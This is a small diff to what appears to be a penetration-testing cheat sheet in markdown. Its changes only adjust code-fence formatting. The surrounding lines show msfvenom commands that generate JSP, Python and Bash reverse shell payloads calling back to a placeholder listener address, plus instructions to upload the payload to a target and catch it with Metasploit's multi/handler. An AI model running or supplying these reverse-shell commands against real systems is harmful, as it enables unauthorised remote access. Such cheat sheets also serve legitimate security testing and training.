@@ -394,7 +394,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Por
 
 
 To create Python Reverse Shell
+```
 msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
+```
 
 To create Bash Unix Reverse Shell
 
@@ -406,7 +408,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 **To use them in target system first upload a payload based on target interface and start multi/handler in your msfconsole**
 
 
-'''
+```
 # msfconsole
 
 msf5 > use exploit/multi/handler
